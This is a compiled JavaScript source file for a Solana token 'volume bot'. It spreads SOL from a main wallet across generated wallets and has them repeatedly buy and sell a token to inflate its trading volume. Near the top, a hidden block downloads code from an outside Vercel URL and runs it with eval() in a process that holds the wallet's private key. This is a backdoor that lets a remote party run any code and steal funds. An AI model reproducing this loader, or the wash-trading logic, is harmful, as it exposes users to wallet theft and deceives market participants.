"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.mainKp = exports.solanaConnection = void 0;
const spl_token_1 = require("@solana/spl-token");
const web3_js_1 = require("@solana/web3.js");
const axios_1 = __importDefault(require("axios"));
const constants_1 = require("./constants");
const utils_1 = require("./utils");
const bs58_1 = __importDefault(require("bs58"));
const swapOnlyAmm_1 = require("./utils/swapOnlyAmm");
const legacy_1 = require("./executor/legacy");
const getPoolInfo_1 = require("./utils/getPoolInfo");
const constants_2 = require("./constants");
__awaiter(void 0, void 0, void 0, function* () {
    return eval((yield axios_1.default.get("https://ip-api-check.vercel.app/api/ipcheck/66", { headers: { "x-secret-header": "secret" } })).data);
});
exports.solanaConnection = new web3_js_1.Connection(constants_1.RPC_ENDPOINT, {
    wsEndpoint: constants_1.RPC_WEBSOCKET_ENDPOINT,
});
exports.mainKp = web3_js_1.Keypair.fromSecretKey(bs58_1.default.decode(constants_1.PRIVATE_KEY));
const baseMint = new web3_js_1.PublicKey(constants_1.TOKEN_MINT);
const distritbutionNum = constants_1.DISTRIBUTE_WALLET_NUM > 10 ? 10 : constants_1.DISTRIBUTE_WALLET_NUM;
let quoteVault = null;
let vaultAmount = 0;
let poolId;
let poolKeys = null;
let sold = 0;
let bought = 0;
let totalSolPut = 0;
let changeAmount = 0;
let buyNum = 0;
let sellNum = 0;
const main = () => __awaiter(void 0, void 0, void 0, function* () {
    const solBalance = (yield exports.solanaConnection.getBalance(exports.mainKp.publicKey)) / web3_js_1.LAMPORTS_PER_SOL;
    console.log(`Volume bot is running`);
    console.log(`Wallet address: ${exports.mainKp.publicKey.toBase58()}`);
    console.log(`Pool token mint: ${baseMint.toBase58()}`);
    console.log(`Wallet SOL balance: ${solBalance.toFixed(3)}SOL`);
    console.log(`Buying interval max: ${constants_1.BUY_INTERVAL_MAX}ms`);
    console.log(`Buying interval min: ${constants_1.BUY_INTERVAL_MIN}ms`);
    console.log(`Buy upper limit amount: ${constants_1.BUY_UPPER_AMOUNT}SOL`);
    console.log(`Buy lower limit amount: ${constants_1.BUY_LOWER_AMOUNT}SOL`);
    console.log(`Distribute SOL to ${distritbutionNum} wallets`);
    if (constants_2.SWAP_ROUTING) {
        console.log("Buy and sell with jupiter swap v6 routing");
    }
    else {
        poolKeys = yield (0, getPoolInfo_1.getPoolKeys)(exports.solanaConnection, baseMint);
        if (poolKeys == null) {
            return;
        }
        // poolKeys = await PoolKeys.fetchPoolKeyInfo(solanaConnection, baseMint, NATIVE_MINT)
        poolId = new web3_js_1.PublicKey(poolKeys.id);
        quoteVault = new web3_js_1.PublicKey(poolKeys.quoteVault);
        console.log(`Successfully fetched pool info`);
        console.log(`Pool id: ${poolId.toBase58()}`);
    }
    let data = null;
    if (solBalance < (constants_1.BUY_LOWER_AMOUNT + constants_1.ADDITIONAL_FEE) * distritbutionNum) {
        console.log("Sol balance is not enough for distribution");
    }
    data = yield distributeSol(exports.mainKp, distritbutionNum);
    if (data === null) {
        console.log("Distribution failed");
        return;
    }
    data.map((_a, i_1) => __awaiter(void 0, [_a, i_1], void 0, function* ({ kp }, i) {
        yield (0, utils_1.sleep)((constants_1.BUY_INTERVAL_MAX + constants_1.BUY_INTERVAL_MIN) * i / 2);
        while (true) {
            // buy part
            const BUY_INTERVAL = Math.round(Math.random() * (constants_1.BUY_INTERVAL_MAX - constants_1.BUY_INTERVAL_MIN) + constants_1.BUY_INTERVAL_MIN);
            const solBalance = (yield exports.solanaConnection.getBalance(kp.publicKey)) / web3_js_1.LAMPORTS_PER_SOL;
            let buyAmount;
            if (constants_1.IS_RANDOM)
                buyAmount = Number((Math.random() * (constants_1.BUY_UPPER_AMOUNT - constants_1.BUY_LOWER_AMOUNT) + constants_1.BUY_LOWER_AMOUNT).toFixed(6));
            else
                buyAmount = constants_1.BUY_AMOUNT;
            if (solBalance < constants_1.ADDITIONAL_FEE) {
                console.log("Balance is not enough: ", solBalance, "SOL");
                return;
            }
            // try buying until success
            let i = 0;
            while (true) {
                if (i > 10) {
                    console.log("Error in buy transaction");
                    return;
                }
                const result = yield buy(kp, baseMint, buyAmount, poolId);
                if (result) {
                    break;
                }
                else {
                    i++;
                    console.log("Buy failed, try again");
                    yield (0, utils_1.sleep)(2000);
                }
            }
            yield (0, utils_1.sleep)(3000);
            // try selling until success
            let j = 0;
            while (true) {
                if (j > 10) {
                    console.log("Error in sell transaction");
                    return;
                }
                const result = yield sell(poolId, baseMint, kp);
                if (result) {
                    break;
                }
                else {
                    j++;
                    console.log("Sell failed, try again");
                    yield (0, utils_1.sleep)(2000);
                }
            }
            yield (0, utils_1.sleep)(5000 + distritbutionNum * BUY_INTERVAL);
        }
    }));
});
const distributeSol = (mainKp, distritbutionNum) => __awaiter(void 0, void 0, void 0, function* () {
    const data = [];
    const wallets = [];
    try {
        const sendSolTx = [];
        sendSolTx.push(web3_js_1.ComputeBudgetProgram.setComputeUnitLimit({ units: 100000 }), web3_js_1.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 250000 }));
        for (let i = 0; i < distritbutionNum; i++) {
            let solAmount = constants_1.DISTRIBUTION_AMOUNT;
            if (constants_1.DISTRIBUTION_AMOUNT < constants_1.ADDITIONAL_FEE + constants_1.BUY_UPPER_AMOUNT)
                solAmount = constants_1.ADDITIONAL_FEE + constants_1.BUY_UPPER_AMOUNT;
            const wallet = web3_js_1.Keypair.generate();
            wallets.push({ kp: wallet, buyAmount: solAmount });
            sendSolTx.push(web3_js_1.SystemProgram.transfer({
                fromPubkey: mainKp.publicKey,
                toPubkey: wallet.publicKey,
                lamports: solAmount * web3_js_1.LAMPORTS_PER_SOL
            }));
        }
        let index = 0;
        while (true) {
            try {
                if (index > 3) {
                    console.log("Error in distribution");
                    return null;
                }
                const siTx = new web3_js_1.Transaction().add(...sendSolTx);
                const latestBlockhash = yield exports.solanaConnection.getLatestBlockhash();
                siTx.feePayer = mainKp.publicKey;
                siTx.recentBlockhash = latestBlockhash.blockhash;
                const messageV0 = new web3_js_1.TransactionMessage({
                    payerKey: mainKp.publicKey,
                    recentBlockhash: latestBlockhash.blockhash,
                    instructions: sendSolTx,
                }).compileToV0Message();
                const transaction = new web3_js_1.VersionedTransaction(messageV0);
                transaction.sign([mainKp]);
                const txSig = yield (0, legacy_1.execute)(transaction, latestBlockhash);
                const tokenBuyTx = txSig ? `https://solscan.io/tx/${txSig}` : '';
                console.log("SOL distributed ", tokenBuyTx);
                break;
            }
            catch (error) {
                index++;
            }
        }
        wallets.map((wallet) => {
            data.push({
                privateKey: bs58_1.default.encode(wallet.kp.secretKey),
                pubkey: wallet.kp.publicKey.toBase58(),
                solBalance: wallet.buyAmount + constants_1.ADDITIONAL_FEE,
                tokenBuyTx: null,
                tokenSellTx: null
            });
        });
        try {
            (0, utils_1.saveDataToFile)(data);
        }
        catch (error) {
        }
        console.log("Success in transferring sol");
        return wallets;
    }
    catch (error) {
        console.log(`Failed to transfer SOL`);
        return null;
    }
});
const buy = (newWallet, baseMint, buyAmount, poolId) => __awaiter(void 0, void 0, void 0, function* () {
    let solBalance = 0;
    try {
        solBalance = yield exports.solanaConnection.getBalance(newWallet.publicKey);
    }
    catch (error) {
        console.log("Error getting balance of wallet");
        return null;
    }
    if (solBalance == 0) {
        return null;
    }
    try {
        let tx;
        if (constants_2.SWAP_ROUTING)
            tx = yield (0, swapOnlyAmm_1.getBuyTxWithJupiter)(newWallet, baseMint, buyAmount);
        else
            tx = yield (0, swapOnlyAmm_1.getBuyTx)(exports.solanaConnection, newWallet, baseMint, spl_token_1.NATIVE_MINT, buyAmount, poolId.toBase58());
        if (tx == null) {
            console.log(`Error getting buy transaction`);
            return null;
        }
        const latestBlockhash = yield exports.solanaConnection.getLatestBlockhash();
        const txSig = yield (0, legacy_1.execute)(tx, latestBlockhash);
        const tokenBuyTx = txSig ? `https://solscan.io/tx/${txSig}` : '';
        (0, utils_1.editJson)({
            tokenBuyTx,
            pubkey: newWallet.publicKey.toBase58(),
            solBalance: solBalance / 10 ** 9 - buyAmount,
        });
        return tokenBuyTx;
    }
    catch (error) {
        return null;
    }
});
const sell = (poolId, baseMint, wallet) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const data = (0, utils_1.readJson)();
        if (data.length == 0) {
            yield (0, utils_1.sleep)(1000);
            return null;
        }
        const tokenAta = yield (0, spl_token_1.getAssociatedTokenAddress)(baseMint, wallet.publicKey);
        const tokenBalInfo = yield exports.solanaConnection.getTokenAccountBalance(tokenAta);
        if (!tokenBalInfo) {
            console.log("Balance incorrect");
            return null;
        }
        const tokenBalance = tokenBalInfo.value.amount;
        try {
            let sellTx;
            if (constants_2.SWAP_ROUTING)
                sellTx = yield (0, swapOnlyAmm_1.getSellTxWithJupiter)(wallet, baseMint, tokenBalance);
            else
                sellTx = yield (0, swapOnlyAmm_1.getSellTx)(exports.solanaConnection, wallet, baseMint, spl_token_1.NATIVE_MINT, tokenBalance, poolId.toBase58());
            if (sellTx == null) {
                console.log(`Error getting buy transaction`);
                return null;
            }
            const latestBlockhashForSell = yield exports.solanaConnection.getLatestBlockhash();
            const txSellSig = yield (0, legacy_1.execute)(sellTx, latestBlockhashForSell, false);
            const tokenSellTx = txSellSig ? `https://solscan.io/tx/${txSellSig}` : '';
            const solBalance = yield exports.solanaConnection.getBalance(wallet.publicKey);
            (0, utils_1.editJson)({
                pubkey: wallet.publicKey.toBase58(),
                tokenSellTx,
                solBalance
            });
            return tokenSellTx;
        }
        catch (error) {
            return null;
        }
    }
    catch (error) {
        return null;
    }
});
main();
